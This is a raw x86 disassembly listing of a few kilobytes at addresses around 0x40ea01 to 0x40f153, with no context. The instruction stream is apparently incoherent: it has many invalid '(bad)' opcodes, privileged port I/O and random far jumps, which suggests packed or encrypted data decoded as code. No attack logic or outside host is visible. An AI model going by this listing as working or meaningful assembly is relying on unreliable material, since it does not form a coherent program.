  40ea01:	outs   dx,BYTE PTR ds:[esi]
  40ea02:	(bad)  [ebx]
  40ea04:	out    dx,eax
  40ea05:	out    0xfd,eax
  40ea07:	repz loop 0x40ea74
  40ea0a:	mov    ebp,0xd7fa7717
  40ea0f:	pop    ebp
  40ea10:	lea    ebx,[eax]
  40ea12:	into   
  40ea13:	push   ebx
  40ea14:	test   DWORD PTR [edx-0x6e],edi
  40ea17:	push   edx
  40ea18:	imul   ecx,DWORD PTR [eax-0x5a],0x54537c30
  40ea1f:	xchg   ebx,eax
  40ea20:	retf   0xdba8
  40ea23:	js     0x40ea2b
  40ea25:	push   ss
  40ea26:	add    ch,BYTE PTR [ebp-0x44]
  40ea29:	mov    edx,0x916d2f28
  40ea2e:	add    dl,BYTE PTR [esi-0x5f]
  40ea31:	arpl   WORD PTR [ebx],si
  40ea33:	aas    
  40ea34:	jno    0x40ea29
  40ea36:	sbb    ebp,DWORD PTR ds:0x39cf3719
  40ea3c:	bound  esp,QWORD PTR [ebp+0x30]
  40ea3f:	push   ebp
  40ea40:	ins    BYTE PTR es:[edi],dx
  40ea41:	mov    eax,0xc1333898
  40ea46:	es or  al,0x3c
  40ea49:	fisub  DWORD PTR [edx-0xb948547]
  40ea4f:	lods   eax,DWORD PTR ds:[esi]
  40ea50:	in     eax,0x13
  40ea52:	std    
  40ea53:	and    BYTE PTR [eax],ah
  40ea55:	popf   
  40ea56:	jl     0x40ea74
  40ea58:	xor    DWORD PTR [edx],ebx
  40ea5a:	(bad)  
  40ea5b:	jg     0x40ea26
  40ea5d:	and    al,0xbd
  40ea5f:	xchg   BYTE PTR [ebx],bh
  40ea61:	out    0xda,al
  40ea63:	imul   eax,esi,0x60
  40ea66:	push   0x4b
  40ea68:	test   al,0x10
  40ea6a:	push   ds
  40ea6b:	call   0x765b:0x29e10d4
  40ea72:	adc    dl,0x52
  40ea75:	pop    ebx
  40ea76:	or     esi,esp
  40ea78:	into   
  40ea79:	shl    edi,1
  40ea7b:	pop    eax
  40ea7c:	push   cs
  40ea7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea7e:	inc    ebx
  40ea7f:	(bad)  
  40ea80:	hlt    
  40ea81:	cwde   
  40ea82:	rcl    BYTE PTR [edx],0x1d
  40ea85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea86:	aad    0x49
  40ea88:	xchg   ebp,eax
  40ea89:	sub    BYTE PTR gs:[ebp-0x5b],ch
  40ea8d:	out    dx,al
  40ea8e:	in     eax,dx
  40ea8f:	fild   QWORD PTR [ebx+eax*4]
  40ea92:	xchg   ecx,eax
  40ea93:	ins    DWORD PTR es:[edi],dx
  40ea94:	out    0xae,al
  40ea96:	fistp  WORD PTR [edx+0x17adec66]
  40ea9c:	daa    
  40ea9d:	xor    BYTE PTR [edx-0x1c],ch
  40eaa0:	dec    ebp
  40eaa1:	cli    
  40eaa2:	(bad)  
  40eaa3:	das    
  40eaa4:	push   ss
  40eaa5:	and    al,BYTE PTR cs:[edx]
  40eaa8:	int3   
  40eaa9:	getsec 
  40eaab:	ja     0x40eacf
  40eaad:	push   eax
  40eaae:	retf   
  40eaaf:	retf   0x93c9
  40eab2:	adc    DWORD PTR ds:0xd526ca9e,eax
  40eab8:	rcl    BYTE PTR [edi-0x5af754dc],0x4c
  40eabf:	or     BYTE PTR [edi-0x7fff14f2],bl
  40eac5:	imul   esi,DWORD PTR [ecx-0x28],0xb4610605
  40eacc:	enter  0x7f8c,0x8e
  40ead0:	xchg   edi,eax
  40ead1:	mov    ch,0xc0
  40ead3:	inc    BYTE PTR [ebx-0x7a]
  40ead6:	test   eax,0x1e796b3f
  40eadb:	or     cl,BYTE PTR [esi+0x28]
  40eade:	out    0xe6,al
  40eae0:	ret    0xcee6
  40eae3:	dec    edi
  40eae4:	push   edx
  40eae5:	scas   al,BYTE PTR es:[edi]
  40eae6:	and    eax,0xae425f9c
  40eaeb:	mov    dl,dl
  40eaed:	stos   DWORD PTR es:[edi],eax
  40eaee:	(bad)  
  40eaef:	(bad)  
  40eaf0:	adc    BYTE PTR [ebx+0x11],bh
  40eaf3:	and    al,0xa5
  40eaf5:	arpl   WORD PTR fs:[edx+ebx*8],bx
  40eaf9:	mov    bl,0xa7
  40eafb:	bound  edi,QWORD PTR [ebp+ecx*2-0x76]
  40eaff:	test   al,0x4e
  40eb01:	jmp    0xfda0:0x71ae88bb
  40eb08:	xor    DWORD PTR [esp+ebx*8],edx
  40eb0b:	push   ss
  40eb0c:	pop    eax
  40eb0d:	mov    ds:0xcc812a7c,eax
  40eb12:	mov    al,ds:0x1390dacd
  40eb17:	jae    0x40eab7
  40eb19:	ins    DWORD PTR es:[edi],dx
  40eb1a:	bound  esi,QWORD PTR [edi]
  40eb1c:	and    BYTE PTR [esi],cl
  40eb1e:	or     DWORD PTR fs:0x2bd485e3,edi
  40eb25:	pop    eax
  40eb26:	(bad)  
  40eb28:	div    BYTE PTR [ebx+0x1d4e1e3a]
  40eb2e:	mov    bl,0xbd
  40eb30:	inc    edi
  40eb31:	test   BYTE PTR [edx+0x6fe6ba73],0x41
  40eb38:	cmp    DWORD PTR [edi-0x54],esi
  40eb3b:	pushf  
  40eb3c:	push   0xffffffee
  40eb3e:	jecxz  0x40eb50
  40eb40:	jg     0x40eaf3
  40eb42:	jb     0x40eacd
  40eb44:	push   0x1a7d6c0d
  40eb49:	jecxz  0x40eacd
  40eb4b:	out    dx,eax
  40eb4c:	jo     0x40eba1
  40eb4e:	cwde   
  40eb4f:	cs popa 
  40eb51:	lods   eax,DWORD PTR ds:[esi]
  40eb52:	aas    
  40eb53:	les    edx,FWORD PTR [edi-0x69fed232]
  40eb59:	into   
  40eb5a:	fild   QWORD PTR [edx]
  40eb5c:	out    0xfb,eax
  40eb5e:	mov    eax,ds:0x83a4315b
  40eb63:	daa    
  40eb64:	test   BYTE PTR [ecx+0x4b],0x3a
  40eb68:	inc    eax
  40eb69:	jae    0x40ebcd
  40eb6b:	out    dx,eax
  40eb6c:	xor    dh,BYTE PTR [ecx+0x72]
  40eb6f:	fs rol esp,1
  40eb72:	ja     0x40eb6b
  40eb74:	cli    
  40eb75:	retf   
  40eb76:	repnz xor ebp,DWORD PTR [esi]
  40eb79:	add    ch,0x37
  40eb7c:	xor    ecx,DWORD PTR [ebp+0x1c]
  40eb7f:	push   0x53582af9
  40eb84:	mov    al,ds:0x29a03ad5
  40eb89:	pop    ebx
  40eb8a:	dec    esi
  40eb8b:	mov    ecx,0xbc3100ba
  40eb90:	jnp    0x40eb3c
  40eb92:	enter  0x96d2,0xd1
  40eb96:	and    DWORD PTR [eax-0xbbf68fc],0x9
  40eb9d:	std    
  40eb9e:	imul   ebx,edx,0x61c5aaa3
  40eba4:	mov    al,0x23
  40eba6:	fs (bad) 
  40eba8:	xor    eax,0x6ab8dd1a
  40ebad:	pop    edi
  40ebae:	outs   dx,BYTE PTR ds:[esi]
  40ebaf:	mov    al,0x4d
  40ebb1:	das    
  40ebb2:	scas   eax,DWORD PTR es:[edi]
  40ebb3:	mov    ebx,0xe410b11e
  40ebb8:	fadd   QWORD PTR [esi+ebp*2+0x76]
  40ebbc:	leave  
  40ebbd:	out    dx,al
  40ebbe:	and    DWORD PTR [ebp+0x47eba23],0x1b8b8abd
  40ebc8:	repz sub DWORD PTR [eax-0x6e3032f4],edx
  40ebcf:	ds cwde 
  40ebd1:	inc    ebx
  40ebd2:	sar    WORD PTR [eax-0x7a61b8fb],cl
  40ebd9:	pop    esi
  40ebda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebdb:	pop    esp
  40ebdc:	and    dh,BYTE PTR [esi+0x7aa9dc16]
  40ebe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe3:	jmp    0x40ec62
  40ebe5:	repnz mov ebx,0x4c674a76
  40ebeb:	ret    0x5e1e
  40ebee:	shr    DWORD PTR [edi+0x353e8883],0xe3
  40ebf5:	or     bh,BYTE PTR [edx-0x7b]
  40ebf8:	mov    esi,0x71b31287
  40ebfd:	push   edi
  40ebfe:	out    dx,eax
  40ebff:	push   cs
  40ec00:	sbb    ch,bh
  40ec02:	ror    BYTE PTR [eiz*1+0x5589acf6],1
  40ec09:	pushf  
  40ec0a:	int    0x39
  40ec0c:	add    ah,BYTE PTR ds:0x7067709a
  40ec12:	jbe    0x40ec7f
  40ec14:	sbb    ebp,DWORD PTR [esi]
  40ec16:	(bad)  
  40ec17:	cmp    DWORD PTR [eax+0x4010d301],eax
  40ec1d:	inc    eax
  40ec1e:	(bad)  [ebx+0x7f]
  40ec21:	in     eax,0xad
  40ec23:	adc    ecx,DWORD PTR [edi-0x32]
  40ec26:	cmp    al,BYTE PTR [ecx-0x4f183325]
  40ec2c:	sbb    eax,0xae2f8e18
  40ec31:	mov    BYTE PTR [esp+ebp*2],ah
  40ec34:	test   BYTE PTR [ecx-0x24],0x6e
  40ec38:	dec    ebp
  40ec39:	inc    ebx
  40ec3a:	sahf   
  40ec3b:	ret    0x96b4
  40ec3e:	retf   0xd12
  40ec41:	inc    edx
  40ec42:	jge    0x40ec9a
  40ec44:	in     al,0xfa
  40ec46:	shr    DWORD PTR [esi],0x1f
  40ec49:	sbb    eax,0x84e1372f
  40ec4e:	out    0x15,eax
  40ec50:	push   ds
  40ec51:	pushf  
  40ec52:	retf   
  40ec53:	shl    dh,1
  40ec55:	mov    edx,0x6115b907
  40ec5a:	xabort 0x12
  40ec5d:	cld    
  40ec5e:	mov    eax,DWORD PTR [ecx+0x5]
  40ec61:	push   ebx
  40ec62:	scas   eax,DWORD PTR es:[edi]
  40ec63:	out    dx,al
  40ec64:	pop    esi
  40ec65:	ficom  WORD PTR [ebp-0x70532da5]
  40ec6b:	cli    
  40ec6c:	retf   
  40ec6d:	in     eax,dx
  40ec6e:	(bad)  
  40ec6f:	sbb    DWORD PTR [eax],esi
  40ec71:	bnd jmp 0x40ec18
  40ec74:	lea    edi,[ecx+0x6086b24c]
  40ec7a:	test   eax,0xf9aaa8a
  40ec7f:	test   BYTE PTR [edi+0x1406142d],ch
  40ec85:	loopne 0x40ec40
  40ec87:	(bad)  
  40ec88:	add    DWORD PTR [ecx],ebx
  40ec8a:	mov    dl,0x5
  40ec8c:	or     DWORD PTR [eax-0x51],esp
  40ec8f:	sbb    eax,0x6699ef6
  40ec94:	jp     0x40ec7e
  40ec96:	dec    ebp
  40ec97:	jbe    0x40ecb7
  40ec99:	pop    edx
  40ec9a:	mov    eax,0x2a7f9db
  40ec9f:	pop    esi
  40eca0:	cli    
  40eca1:	js     0x40ec6a
  40eca3:	(bad)  
  40eca4:	bound  edi,QWORD PTR [esi-0x10]
  40eca7:	iret   
  40eca8:	sahf   
  40eca9:	les    ecx,FWORD PTR [ebx+edx*2-0x7986d127]
  40ecb0:	ds pop eax
  40ecb2:	js     0x40ecdd
  40ecb4:	add    al,0xc3
  40ecb6:	dec    eax
  40ecb7:	(bad)  
  40ecb8:	stc    
  40ecb9:	and    dl,bh
  40ecbb:	(bad)  
  40ecbc:	enter  0xb4c7,0x2
  40ecc0:	call   0xe0dc232c
  40ecc5:	pop    esp
  40ecc6:	enter  0xc1ba,0x54
  40ecca:	popf   
  40eccb:	inc    ebp
  40eccc:	(bad)  
  40eccd:	fcom   QWORD PTR [eax+0x1e5e2759]
  40ecd3:	cwde   
  40ecd4:	adc    al,0x24
  40ecd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecd7:	pop    es
  40ecd8:	push   edi
  40ecd9:	push   0xffffffce
  40ecdb:	adc    al,0xe7
  40ecdd:	dec    ebx
  40ecde:	add    DWORD PTR [ebp-0x2c],edx
  40ece1:	addr16 jg 0x40eca1
  40ece4:	aam    0x65
  40ece6:	in     al,dx
  40ece7:	hlt    
  40ece8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ece9:	out    dx,al
  40ecea:	jns    0x40ec97
  40ecec:	adc    BYTE PTR fs:[ebp+0x8],bl
  40ecf0:	sbb    BYTE PTR [ecx],ah
  40ecf2:	mov    edi,0x4df2f9fa
  40ecf7:	or     dl,ah
  40ecf9:	mov    ebx,0x68cc5a91
  40ecfe:	test   DWORD PTR [edi+0x5651c13b],edx
  40ed04:	stc    
  40ed05:	jge    0x40ed1f
  40ed07:	test   BYTE PTR [ebp-0x36],al
  40ed0a:	shl    ebp,1
  40ed0c:	jae    0x40ecf0
  40ed0e:	clc    
  40ed0f:	sbb    BYTE PTR [ebp+0x18],bl
  40ed12:	es retf 
  40ed14:	xchg   ecx,eax
  40ed15:	fild   DWORD PTR [eax]
  40ed17:	push   esp
  40ed18:	in     eax,dx
  40ed19:	loopne 0x40ecda
  40ed1b:	js     0x40ed99
  40ed1d:	push   esp
  40ed1e:	inc    esi
  40ed1f:	inc    ecx
  40ed20:	lods   al,BYTE PTR fs:[esi]
  40ed22:	clc    
  40ed23:	pop    ebp
  40ed24:	sahf   
  40ed25:	mov    ds:0xeeec7a4e,al
  40ed2a:	sub    al,0x91
  40ed2c:	jle    0x40ed19
  40ed2e:	sbb    al,0x82
  40ed30:	mov    al,ds:0x960fb0fe
  40ed35:	lock mov BYTE PTR [esi+0x36],dh
  40ed39:	add    al,0x1f
  40ed3b:	mov    ch,0xf4
  40ed3d:	jae    0x40ecc6
  40ed3f:	mov    al,0xbf
  40ed41:	jg     0x40ed61
  40ed43:	test   DWORD PTR ds:0x982d3a72,edx
  40ed49:	inc    ecx
  40ed4a:	xor    eax,0x47cb66a1
  40ed4f:	sbb    DWORD PTR [ebp-0x78],0x1f
  40ed53:	iret   
  40ed54:	call   0x2954:0x4924b87e
  40ed5b:	sti    
  40ed5c:	push   ebx
  40ed5d:	gs sub eax,0x8073ada1
  40ed63:	sbb    al,0x77
  40ed65:	sub    DWORD PTR [eax+0x5a],0x0
  40ed69:	sub    DWORD PTR [ecx-0x53],esp
  40ed6c:	(bad)  
  40ed6d:	add    eax,0x8942d526
  40ed72:	and    BYTE PTR [edi+0x4c],ch
  40ed75:	jmp    0xba14c98
  40ed7a:	in     al,0xc4
  40ed7c:	clc    
  40ed7d:	cmc    
  40ed7e:	ror    BYTE PTR [ebx-0x6fa54036],0xf9
  40ed85:	gs mov esp,0x5ef87f3
  40ed8b:	test   DWORD PTR [ebx-0x1c859703],0x1ea6d9f4
  40ed95:	mov    ds:0x1d120cc6,eax
  40ed9a:	mov    ah,0x8
  40ed9c:	mov    BYTE PTR [ebp+0x5db16127],dl
  40eda2:	mov    al,0xe9
  40eda4:	push   esi
  40eda5:	hlt    
  40eda6:	and    esp,eax
  40eda8:	in     eax,0x95
  40edaa:	or     BYTE PTR [edi+eax*8-0x95fff29],al
  40edb1:	xor    bl,al
  40edb3:	cmp    bl,ch
  40edb5:	cmp    esi,ebx
  40edb7:	loop   0x40edeb
  40edb9:	jmp    0xbd68bc00
  40edbe:	pop    edi
  40edbf:	mov    eax,ds:0x349d302d
  40edc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edc5:	das    
  40edc6:	std    
  40edc7:	jns    0x40ed8d
  40edc9:	lods   al,BYTE PTR ds:[esi]
  40edca:	mov    esp,0xc06bbcb6
  40edcf:	adc    eax,DWORD PTR [edx-0x8cd9c7b]
  40edd5:	add    BYTE PTR [edx],ch
  40edd7:	bsf    ebx,DWORD PTR [ecx]
  40edda:	ret    
  40eddb:	sub    al,0xb8
  40eddd:	fwait
  40edde:	push   cs
  40eddf:	out    0x1a,al
  40ede1:	xor    BYTE PTR [ecx+ebp*2+0x20],dh
  40ede5:	jge    0x40ee16
  40ede7:	mov    esp,0x826525ca
  40edec:	push   es
  40eded:	xor    al,BYTE PTR [ebx]
  40edef:	cmp    al,0x79
  40edf1:	ins    DWORD PTR es:[edi],dx
  40edf2:	sbb    eax,0x542d45cf
  40edf7:	ficom  WORD PTR [ecx+0x18]
  40edfa:	sub    ah,ch
  40edfc:	mov    edi,0xf3117592
  40ee01:	xor    BYTE PTR [ebx-0x3d],dh
  40ee04:	je     0x40ee4c
  40ee06:	jbe    0x40ede3
  40ee08:	stos   BYTE PTR es:[edi],al
  40ee09:	(bad)  
  40ee0a:	mov    esi,0x24da2569
  40ee0f:	sub    DWORD PTR [ecx-0x26],eax
  40ee12:	add    cl,ah
  40ee14:	data16 int 0x24
  40ee17:	out    dx,eax
  40ee18:	sub    eax,0xde83b8c8
  40ee1d:	xchg   esi,eax
  40ee1e:	popf   
  40ee1f:	jmp    0xd1732636
  40ee24:	shr    eax,1
  40ee26:	or     ch,al
  40ee28:	xchg   edi,eax
  40ee29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee2a:	adc    esi,edi
  40ee2c:	or     BYTE PTR [eax+0x6a],al
  40ee2f:	sahf   
  40ee30:	sbb    DWORD PTR [edi],ecx
  40ee32:	pcmpeqb mm5,mm6
  40ee35:	call   0x91e89b10
  40ee3a:	sub    al,0x6e
  40ee3c:	pop    ds
  40ee3d:	fwait
  40ee3e:	or     bh,BYTE PTR [esi+0x43]
  40ee41:	ds sti 
  40ee43:	jae    0x40ee84
  40ee45:	loope  0x40ee09
  40ee47:	mov    cs,WORD PTR [edx+0x558d4434]
  40ee4d:	push   ds
  40ee4e:	xor    ch,BYTE PTR [ebp+0x24d3159]
  40ee54:	jl     0x40ee56
  40ee56:	fwait
  40ee57:	and    ah,BYTE PTR [esi+0x21]
  40ee5a:	mov    eax,ds:0xe63f77f6
  40ee5f:	dec    esi
  40ee60:	in     eax,dx
  40ee61:	call   0x98e5:0x73827f58
  40ee68:	data16 mov BYTE PTR [edx-0x3],bh
  40ee6c:	out    0x32,eax
  40ee6e:	sub    dl,BYTE PTR [edi-0x1f8290a2]
  40ee74:	ret    0xba3
  40ee77:	lahf   
  40ee78:	repnz cmp BYTE PTR [edi+ebx*1+0x416a26d8],al
  40ee80:	sub    al,0xc7
  40ee82:	or     ebx,DWORD PTR [ebx+eiz*2+0x2d]
  40ee86:	or     cl,BYTE PTR [edi]
  40ee88:	sub    BYTE PTR [edx+0x4f],0xac
  40ee8c:	jmp    0xa8cffb39
  40ee91:	mov    DWORD PTR [edx-0xd],eax
  40ee94:	ret    
  40ee95:	dec    esi
  40ee96:	push   0x430201be
  40ee9b:	fimul  DWORD PTR [ecx-0x60]
  40ee9e:	sti    
  40ee9f:	ret    0x6147
  40eea2:	cmp    eax,edx
  40eea4:	ins    BYTE PTR es:[edi],dx
  40eea5:	std    
  40eea6:	fisub  WORD PTR [ebp-0x2]
  40eea9:	call   0x5dd5:0xadd4700b
  40eeb0:	(bad)  
  40eeb1:	test   BYTE PTR ds:0xdcc5760e,0x28
  40eeb8:	xlat   BYTE PTR ds:[ebx]
  40eeb9:	fist   DWORD PTR [edx]
  40eebb:	lock inc ebp
  40eebd:	sbb    cl,BYTE PTR es:[esp+esi*2+0x73]
  40eec2:	cs dec edi
  40eec4:	test   eax,0x9d87b411
  40eec9:	mov    ch,0x43
  40eecb:	xor    dh,ch
  40eecd:	lea    ebx,[eax]
  40eecf:	je     0x40ef2c
  40eed1:	bnd ja 0x40eecf
  40eed4:	dec    esi
  40eed5:	aad    0xa8
  40eed7:	call   0x5858:0xcd1a430a
  40eede:	fwait
  40eedf:	cmc    
  40eee0:	adc    al,0x80
  40eee2:	pop    eax
  40eee3:	iret   
  40eee4:	popa   
  40eee5:	xchg   edi,eax
  40eee6:	pusha  
  40eee7:	jb     0x40ee9d
  40eee9:	inc    esi
  40eeea:	(bad)  
  40eeeb:	lock add eax,DWORD PTR [ebp-0x608d24f0]
  40eef2:	dec    ebp
  40eef3:	inc    ebp
  40eef4:	mov    edi,0xc12f79a0
  40eef9:	pop    ebp
  40eefa:	neg    DWORD PTR [ecx-0x2855dcb2]
  40ef00:	jl     0x40ef6c
  40ef02:	aad    0x93
  40ef04:	add    dl,BYTE PTR [ebp+0x40]
  40ef07:	and    ch,ch
  40ef09:	xchg   ebp,eax
  40ef0b:	aam    0x99
  40ef0d:	outs   dx,DWORD PTR ds:[esi]
  40ef0e:	or     eax,0x5bc6ed36
  40ef13:	(bad)  
  40ef14:	fnsave [ecx+0x5ced55a8]
  40ef1a:	(bad)  
  40ef1b:	loopne 0x40ef4b
  40ef1d:	mov    ebx,0x7946d924
  40ef22:	(bad)  [ecx+eiz*8+0x1]
  40ef26:	test   al,0x1b
  40ef28:	or     eax,0xab44a840
  40ef2d:	pusha  
  40ef2e:	dec    ebx
  40ef2f:	lods   al,BYTE PTR ds:[esi]
  40ef30:	xchg   ecx,eax
  40ef31:	dec    edx
  40ef32:	fs push es
  40ef34:	xchg   esp,eax
  40ef35:	shl    DWORD PTR [edx],1
  40ef37:	fsubp  st(1),st
  40ef39:	mov    eax,ds:0x2fb768
  40ef3e:	int    0x91
  40ef40:	gs xchg ebx,eax
  40ef42:	mov    eax,0x867e7037
  40ef47:	pop    edi
  40ef48:	sub    DWORD PTR [edi+0x16],edx
  40ef4b:	sub    dl,BYTE PTR [edi+edi*8]
  40ef4e:	jmp    0x68356c81
  40ef53:	push   eax
  40ef54:	fild   WORD PTR [edi+edx*4+0x7862a935]
  40ef5b:	cdq    
  40ef5c:	sbb    al,BYTE PTR [eax]
  40ef5e:	jbe    0x40ef0c
  40ef60:	inc    esi
  40ef61:	out    dx,eax
  40ef62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef63:	cmp    BYTE PTR [ebx+0x6a],dl
  40ef66:	arpl   WORD PTR [edi+edx*2],di
  40ef69:	stos   BYTE PTR es:[edi],al
  40ef6a:	repnz pop ebx
  40ef6c:	(bad)  
  40ef6d:	jmp    0xb248:0xff8d258b
  40ef74:	or     ecx,DWORD PTR [esi+0x1e0638db]
  40ef7a:	cmp    BYTE PTR [ebx+0x30],dl
  40ef7d:	data16 into 
  40ef7f:	inc    esi
  40ef80:	ret    
  40ef81:	dec    DWORD PTR [ebp-0x59]
  40ef84:	jg     0x40ef63
  40ef86:	mov    DWORD PTR [ebp+eax*4-0x63],esi
  40ef8a:	adc    eax,edi
  40ef8c:	or     DWORD PTR [edi],esp
  40ef8e:	ins    BYTE PTR es:[edi],dx
  40ef8f:	dec    esi
  40ef90:	ins    BYTE PTR es:[edi],dx
  40ef91:	sahf   
  40ef92:	jae    0x40ef33
  40ef94:	mov    DWORD PTR [ecx],eax
  40ef96:	int    0x71
  40ef98:	fadd   st,st(1)
  40ef9a:	cmp    ah,ah
  40ef9c:	mov    edx,0xe1ab55f9
  40efa1:	cli    
  40efa2:	jle    0x40ef60
  40efa4:	xor    BYTE PTR [eax+ebp*2],dl
  40efa7:	xchg   ecx,eax
  40efa8:	sbb    edx,DWORD PTR [eax]
  40efaa:	mov    eax,ds:0x6a7061f8
  40efaf:	cmp    ecx,esi
  40efb1:	dec    ebp
  40efb2:	retf   0xb593
  40efb5:	mov    DWORD PTR [eax],esi
  40efb7:	mov    WORD PTR [esi-0x1],es
  40efba:	mov    esp,0xa099c6e0
  40efbf:	inc    ebx
  40efc0:	enter  0xdb0e,0x8f
  40efc4:	test   eax,0xcfd18c81
  40efc9:	inc    edi
  40efca:	sbb    al,0xf2
  40efcc:	out    0x69,eax
  40efce:	in     eax,0x83
  40efd0:	mov    ecx,DWORD PTR [eax-0x30]
  40efd3:	and    bh,BYTE PTR [esi+0x8]
  40efd6:	jle    0x40f034
  40efd8:	in     al,0xac
  40efda:	cmp    ah,BYTE PTR [ebx+eax*2]
  40efdd:	mov    DWORD PTR [edi-0x6dcc0544],edx
  40efe3:	je     0x40efb7
  40efe5:	(bad)  
  40efe6:	gs pop ecx
  40efe8:	inc    eax
  40efe9:	les    ebp,FWORD PTR [edx-0x2a]
  40efec:	lods   eax,DWORD PTR ds:[esi]
  40efed:	push   0x8
  40efef:	data16 mov dl,0x54
  40eff2:	inc    eax
  40eff3:	xor    al,0x4c
  40eff5:	in     al,dx
  40eff6:	pop    esi
  40eff7:	cmp    BYTE PTR [esi+0x40],ch
  40effa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40effb:	xchg   esi,eax
  40effc:	ss push ebp
  40effe:	and    edi,DWORD PTR [edx-0x78]
  40f001:	popa   
  40f002:	jge    0x40f00d
  40f004:	mov    BYTE PTR [ebp-0x2a],al
  40f007:	das    
  40f008:	fnstenv [ebx-0x3cc33fde]
  40f00e:	sub    BYTE PTR [ecx+0x4a],cl
  40f011:	jle    0x40eff7
  40f013:	retf   
  40f014:	clc    
  40f015:	stc    
  40f016:	xor    edx,DWORD PTR [esi]
  40f018:	jp     0x40f055
  40f01a:	push   ss
  40f01b:	out    0x76,eax
  40f01d:	xor    al,0xcc
  40f01f:	mov    WORD PTR [ecx-0x54093eb4],ds
  40f025:	mov    ecx,0xc9964a44
  40f02a:	jmp    0xe002:0x529caca0
  40f031:	mov    dl,0x98
  40f033:	mov    cl,0xb5
  40f035:	jnp    0x40f09c
  40f037:	pop    esi
  40f038:	sub    al,0xe5
  40f03a:	pusha  
  40f03b:	xchg   ebp,eax
  40f03c:	push   0xffffffc1
  40f03e:	mov    esp,0xf8bc2ca9
  40f043:	cli    
  40f044:	aad    0x1c
  40f046:	xchg   BYTE PTR gs:[eax],dh
  40f049:	and    BYTE PTR [ecx],0x53
  40f04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f04d:	mov    ebp,0xb9fe6622
  40f052:	pop    edx
  40f053:	in     eax,dx
  40f054:	inc    esi
  40f055:	mov    ah,0xbf
  40f057:	jnp    0x40f054
  40f059:	push   ebx
  40f05a:	push   edi
  40f05b:	xlat   BYTE PTR ds:[ebx]
  40f05c:	cmp    eax,0x8697c165
  40f061:	mov    ebp,0x8e361f0e
  40f066:	cli    
  40f067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f068:	cmp    esp,DWORD PTR [ebp+0x63bfc7ed]
  40f06e:	mov    di,0x47e6
  40f072:	ins    BYTE PTR es:[edi],dx
  40f073:	mov    ah,0x7a
  40f075:	neg    BYTE PTR [edx+edi*2]
  40f078:	push   ebx
  40f079:	mov    al,ds:0x87ce35de
  40f07e:	inc    ebp
  40f07f:	lahf   
  40f080:	cmc    
  40f081:	fistp  DWORD PTR [ecx-0x7e6c3778]
  40f087:	shr    DWORD PTR [edi+ebp*2-0x25d3e53],cl
  40f08e:	clc    
  40f08f:	scas   eax,DWORD PTR es:[edi]
  40f090:	inc    edx
  40f091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f092:	scas   eax,DWORD PTR es:[edi]
  40f093:	cmp    BYTE PTR [edi-0x23],cl
  40f096:	sbb    al,0x65
  40f098:	jmp    0x9060:0x813480c7
  40f09f:	aam    0x10
  40f0a1:	jmp    0x636a:0x536da67f
  40f0a8:	mov    bl,0x83
  40f0aa:	les    esp,FWORD PTR [ebx+0x1b]
  40f0ad:	out    dx,al
  40f0ae:	ror    ebp,0xb
  40f0b1:	mov    esi,ecx
  40f0b3:	push   0x4c95c5aa
  40f0b8:	jg     0x40f101
  40f0ba:	sub    eax,0xb2fe8365
  40f0bf:	iret   
  40f0c0:	mov    ds:0x4ca25688,al
  40f0c5:	sbb    DWORD PTR [ecx],0x1c
  40f0c8:	pop    esp
  40f0c9:	fsubp  st(6),st
  40f0cb:	lods   al,BYTE PTR ds:[esi]
  40f0cc:	pop    edi
  40f0cd:	and    BYTE PTR [edi-0x2f],ch
  40f0d0:	dec    ebx
  40f0d1:	retf   
  40f0d2:	mov    esi,0x4dd94a09
  40f0d7:	sti    
  40f0d8:	dec    edx
  40f0d9:	cmc    
  40f0da:	mov    eax,0xf020e61a
  40f0df:	stc    
  40f0e0:	test   eax,0x9577ad3
  40f0e5:	cmp    al,0xc
  40f0e7:	adc    al,0x46
  40f0e9:	xchg   bl,cl
  40f0eb:	xchg   esi,eax
  40f0ec:	jno    0x40f110
  40f0ee:	jle    0x40f0d6
  40f0f0:	iret   
  40f0f1:	retf   0x7822
  40f0f4:	das    
  40f0f5:	xor    BYTE PTR [ecx],0xa4
  40f0f8:	pusha  
  40f0f9:	pop    ds
  40f0fa:	ss or  edi,ebp
  40f0fd:	sbb    eax,0x1d4f8833
  40f102:	inc    edi
  40f103:	retf   0xebd0
  40f106:	mov    ebx,0xb263c5d7
  40f10b:	std    
  40f10c:	adc    ch,dh
  40f10e:	out    dx,eax
  40f10f:	push   ecx
  40f110:	outs   dx,BYTE PTR ds:[esi]
  40f111:	pushf  
  40f112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f114:	popf   
  40f115:	pop    ds
  40f116:	fbstp  TBYTE PTR [ebx+0x78a9720]
  40f11c:	outs   dx,DWORD PTR ds:[esi]
  40f11d:	dec    ecx
  40f11e:	icebp  
  40f11f:	int    0x6
  40f121:	and    ch,ah
  40f123:	loope  0x40f10b
  40f125:	mov    bh,0x4d
  40f127:	scas   al,BYTE PTR es:[edi]
  40f128:	out    0xe5,eax
  40f12a:	and    dh,BYTE PTR [esi+ebx*8]
  40f12d:	inc    edi
  40f12e:	pop    ebp
  40f12f:	xor    eax,0x3ce1afde
  40f134:	or     esp,DWORD PTR [ebx+edi*8]
  40f137:	clc    
  40f138:	mov    cl,BYTE PTR [ebx-0x71]
  40f13b:	ret    
  40f13c:	sub    ch,BYTE PTR [edx-0x5d]
  40f13f:	sbb    al,0xd7
  40f141:	jne    0x40f122
  40f143:	jnp    0x40f196
  40f145:	(bad)  
  40f146:	mov    bh,0x2b
  40f148:	xor    DWORD PTR [ecx+0x7030e50d],ecx
  40f14e:	sbb    eax,0x310edf13
  40f153:	les    ecx,FWORD PTR [ebx+0x64]
